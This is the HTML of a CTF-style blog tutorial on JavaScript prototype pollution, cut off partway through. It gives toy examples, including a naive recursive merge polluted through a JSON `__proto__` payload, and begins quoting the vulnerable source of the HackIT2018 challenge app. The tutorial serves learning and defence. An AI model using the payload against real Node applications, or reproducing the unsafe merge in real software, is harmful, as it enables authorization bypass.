@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="In 2020ciscn final .We meet an easy js prototype pollution attack question named “Final-Monster Battle”.In my fault,it makes me angur.I understand if you want learn some thing well you need practice i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript Prototype Pollution Attack">
+<meta property="og:url" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="In 2020ciscn final .We meet an easy js prototype pollution attack question named “Final-Monster Battle”.In my fault,it makes me angur.I understand if you want learn some thing well you need practice i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/1.png">
+<meta property="og:image" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/2.png">
+<meta property="og:image" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/3.png">
+<meta property="og:image" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/4.png">
+<meta property="article:published_time" content="2020-12-10T23:11:11.000Z">
+<meta property="article:modified_time" content="2020-12-11T03:07:20.000Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JavaScript Prototype Pollution Attack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/12/01/Some-Php-Pop-Chain-Analysis/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&text=JavaScript Prototype Pollution Attack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&is_video=false&description=JavaScript Prototype Pollution Attack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JavaScript Prototype Pollution Attack&body=Check out this article: http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&name=JavaScript Prototype Pollution Attack&description=&lt;p&gt;In 2020ciscn final .We meet an easy js prototype pollution attack question named “Final-Monster Battle”.In my fault,it makes me angur.I understand if you want learn some thing well you need practice it.practice make perfect!&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&t=JavaScript Prototype Pollution Attack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Basic-prototype"><span class="toc-number">1.</span> <span class="toc-text">1. Basic- prototype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Prototype-Pollution"><span class="toc-number">2.</span> <span class="toc-text">2. Prototype Pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-some-env-cause-prototype-pollution"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. some env cause prototype pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-easy-env"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1. easy env</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-complex-env"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2. complex env</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-HackIT2018-Republic-of-Gayming"><span class="toc-number">3.</span> <span class="toc-text">3. HackIT2018 Republic_of_Gayming</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CISCN-2020-Final-Monster-Battle"><span class="toc-number">4.</span> <span class="toc-text">4. CISCN 2020 Final Monster Battle</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JavaScript Prototype Pollution Attack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-10T23:11:11.000Z" class="dt-published" itemprop="datePublished">2020-12-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>In 2020ciscn final .We meet an easy js prototype pollution attack question named “Final-Monster Battle”.In my fault,it makes me angur.I understand if you want learn some thing well you need practice it.practice make perfect!</p>
+<span id="more"></span>
+<!-- toc -->
+<h2 id="1-Basic-prototype"><a href="#1-Basic-prototype" class="headerlink" title="1. Basic- prototype"></a>1. Basic- prototype</h2><p>In javascript we can alse create a class</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br></pre></td></tr></table></figure>
+<p>age is an attribute of class Persion.You can use <code>.age</code> or <code>[&#39;age&#39;]</code> get it,for example</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> girl=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl[<span class="string">&#x27;age&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>Also,we can define function in JS.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sing</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;miao miao miao&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Persion</span>()).<span class="title function_">sing</span>()</span><br></pre></td></tr></table></figure>
+<p>we can alse use <code>prototype</code> or <code>__proto__</code> to define a function.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Persion</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">girlsing</span>=<span class="keyword">function</span> <span class="title function_">sing</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;miao miao miao&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> girl=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line">girl.<span class="title function_">girlsing</span>()</span><br></pre></td></tr></table></figure>
+<p>prototype is an attribute of class,and <code>__proto__</code> is an attribute of obj.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> girl=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line"></span><br><span class="line">girl.<span class="property">__proto__</span>.<span class="property">girlsing</span>=<span class="keyword">function</span> <span class="title function_">sing</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;miao miao miao&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> boy=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line">girl.<span class="title function_">girlsing</span>()</span><br></pre></td></tr></table></figure>
+<p>as same <code>girl.__proto__ == Persion.prototype</code></p>
+<h2 id="2-Prototype-Pollution"><a href="#2-Prototype-Pollution" class="headerlink" title="2. Prototype Pollution"></a>2. Prototype Pollution</h2><p>we can learn prototype pollution from an example</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Persion</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> girl=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line"><span class="keyword">let</span> boy=<span class="keyword">new</span> <span class="title class_">Persion</span>()</span><br><span class="line">girl.<span class="property">__proto__</span>.<span class="property">girlsing</span>=<span class="keyword">function</span> <span class="title function_">sing</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;miao miao miao&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">boy.<span class="title function_">girlsing</span>()</span><br><span class="line"><span class="comment">//output:miao miao miao</span></span><br></pre></td></tr></table></figure>
+<p>we can learn ,when girl obj got girlsing func,other obj which creat by Persion class all have this func.i mean this is a easy prototype pollution.(pollution process can after ceate an obj process)</p>
+<h3 id="2-1-some-env-cause-prototype-pollution"><a href="#2-1-some-env-cause-prototype-pollution" class="headerlink" title="2.1. some env cause prototype pollution"></a>2.1. some env cause prototype pollution</h3><p>In js can use <code>[&#39;attr&#39;]</code> get attribute of obj. </p>
+<h4 id="2-1-1-easy-env"><a href="#2-1-1-easy-env" class="headerlink" title="2.1.1. easy env"></a>2.1.1. easy env</h4><p><code>x[param1][param2] = param3;</code><br>we can contrl an obj’ attr and value.<br>we can transmit param1&#x3D;<code>__proto__</code>,param2&#x3D;<code>&#123;we want attr&#125;</code>,param3&#x3D;<code>&#123;we want value&#125;</code><br>(a tips:we can only pollute attribute which this obj don’t define.Because there have both attr, the default is to find their own properties and then recurs upward)<br>or <code>x[param1]= param2;</code>,we can transmit param1&#x3D;<code>__proto__</code>,param2&#x3D;<code>&#123;&#123;key:value&#125;&#125;</code><br><img src="/2020/12/11/JavaScript-Prototype-Pollution-Attack/1.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=[]</span><br><span class="line"><span class="keyword">let</span> b = []</span><br><span class="line">x1=<span class="string">&#x27;__proto__&#x27;</span></span><br><span class="line">x2=<span class="string">&#x27;bar&#x27;</span></span><br><span class="line">x3=<span class="number">2</span></span><br><span class="line">a[x1][x2] = x3</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">bar</span>)</span><br><span class="line"><span class="comment">// output 2</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-1-2-complex-env"><a href="#2-1-2-complex-env" class="headerlink" title="2.1.2. complex env"></a>2.1.2. complex env</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+<p>output</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
+<p>so we fail.because in <code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>,we just let o2.b&#x3D;&#x3D;2 when merge.so we need change JSON</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+<p>output</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-HackIT2018-Republic-of-Gayming"><a href="#3-HackIT2018-Republic-of-Gayming" class="headerlink" title="3. HackIT2018 Republic_of_Gayming"></a>3. HackIT2018 Republic_of_Gayming</h2><p><a target="_blank" rel="noopener" href="https://github.com/bkfish/HackIT2018/blob/master/web/Republic_of_Gayming/app.js">https://github.com/bkfish/HackIT2018</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> hbs = <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">&#x27;md5&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morganBody = <span class="built_in">require</span>(<span class="string">&#x27;morgan-body&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> user = []; <span class="comment">//empty for now</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> matrix = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">	matrix[i] = [<span class="literal">null</span> , <span class="literal">null</span>, <span class="literal">null</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params">mat</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (matrix[i][j] !== <span class="literal">null</span>)&#123;</span><br><span class="line">				count += <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count === <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="title function_">morganBody</span>(app);</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">		matrix[i] = [<span class="literal">null</span> , <span class="literal">null</span>, <span class="literal">null</span>];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">	<span class="comment">/*this is under development I guess ??*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(user.<span class="property">admintoken</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">querytoken</span> &amp;&amp; <span class="title function_">md5</span>(user.<span class="property">admintoken</span>) === req.<span class="property">query</span>.<span class="property">querytoken</span>)&#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> client = req.<span 